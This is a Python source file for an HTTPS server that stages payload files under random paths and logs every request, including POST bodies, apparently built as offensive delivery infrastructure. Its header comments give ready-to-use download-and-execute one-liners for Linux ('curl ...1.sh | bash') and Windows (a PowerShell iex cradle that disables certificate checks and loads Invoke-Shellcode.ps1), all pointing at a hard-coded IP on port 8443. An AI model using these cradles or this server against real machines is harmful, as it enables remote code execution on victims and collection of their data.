# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

# Linux
'''
curl https://170.170.13.87:8443/1.sh -k -s|bash
wget https://170.170.13.87:8443/1.sh --no-check-certificate
'''

# Windows
'''
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
iex(New-Object Net.WebClient).DownloadString('https://170.170.13.87:8443/Invoke-Shellcode.ps1')

(New-Object Net.WebClient).DownloadFile('https://170.170.13.87:8443/1.zip','c:\1.zip')
'''

import ssl, http.server
import optparse
import cgi
import pprint
import datetime
import os
import platform
import random
import json

log_file = ""
current_path = ""
WORK_SPACE = "./html"
data_path = ""
random_path = []
class MyHTTPSServer(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path[-1] == '/':
            self.path = '/00000000000000000000404.html'
        with open(log_file, 'a+', encoding='UTF-8') as f:
            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write("------------------------------------------------\n")
            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
            f.write(content+"\n")
            f.write(str(self.headers))
            f.close()
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path[-1] == '/':
            self.path = '/00000000000000000000404.html'
        req_datas = self.rfile.read(int(self.headers['content-length']))
        with open(log_file, 'a+', encoding='UTF-8') as f:
            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write("------------------------------------------------\n")
            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
            f.write(content+"\n")
            f.write(str(self.headers))
            f.write(req_datas.decode())
            f.close()
        print(content)
        # send ?
        data= {
            'result_code':'2',
            'result_desc':'Success',
            'timestamp': '',
            'data': {'message_id':'25d55ad283aa400af464c76d713c07ad'}
        }
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
        return
        
def show_banner():
    content = "===================================================================================\n  __  __       _    _ _______ _______ _____   _____ _____                          \n |  \\/  |     | |  | |__   __|__   __|  __ \\ / ____/ ____|                         \n | \\  / |_   _| |__| |  | |     | |  | |__) | (___| (___   ___  _ _ __   _____ _ __ \n | |\\/| | | | |  __  |  | |     | |  |  ___/ \\___ \\\\___ \\ / _ \\| '/ \\ \\ / / _ \\ '__|\n | |  | | |_| | |  | |  | |     | |  | |     ____) |___) |  __/| |   \\ V /  __/ |   \n |_|  |_|\\__, |_|  |_|  |_|     |_|  |_|    |_____/_____/ \\___ |_|    \\_/ \\___|_|   \n          __/ |                                                     @aplyc1a       \n         |___/                                                                     \n===================================================================================\n"
    print(content)

def get_random_str(bits):
    num_set = [chr(i) for i in range(48,58)]
    char_set = [chr(i) for i in range(97,123)]
    char_set2 = [chr(i) for i in range(65,91)]
    total_set = num_set + char_set + char_set2

    value_set = "".join(random.sample(total_set, bits))

    return value_set

def fix_env():
    global log_file
    global data_path
    global current_path
    import shutil
    current_path = os.getcwd()
    if platform.system() == 'Windows':
        log_path = current_path + "\\log"
        log_file = current_path + "\\log\\access.log"
        data_path = current_path + "\\data\\"
    else:
        log_path = current_path + "/log"
        log_file = current_path + "/log/access.log"
        data_path = current_path + "/data/"
    if not os.path.exists(log_path):
        os.makedirs("log")
    if os.path.exists(WORK_SPACE):
        shutil.rmtree(WORK_SPACE)
    os.makedirs(WORK_SPACE)
    os.chdir(WORK_SPACE)
    for i in os.listdir(data_path):
        path = get_random_str(30)
        if os.path.isdir(data_path+i):
            os.makedirs(path)
            if platform.system() == 'Windows':
                shutil.copytree(data_path+i, path+"\\"+i)
            else:
                shutil.copytree(data_path+i, path+"/"+i)
            continue
        if '404.html' in i :
            shutil.copy(data_path+i, "./")
            continue
        if 'favicon.ico' in i :
            shutil.copy(data_path+i, "./")
            continue
        os.makedirs(path)
        shutil.copy(data_path+i, path)
        random_path.append(path)
    
def main():
    parser = optparse.OptionParser('python httpsserver.py -p 8443 ' )
    parser.add_option('-p', '--port', dest = 'port', type = 'string', default=443, help = 'set port of https service.')
    (options,args) = parser.parse_args()
    port=options.port

    httpd = http.server.HTTPServer(('0.0.0.0', int(port)), MyHTTPSServer)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.pem', server_side=True)
    
    show_banner()    
    fix_env()
    httpd.serve_forever()

if __name__ == '__main__': 
    main()
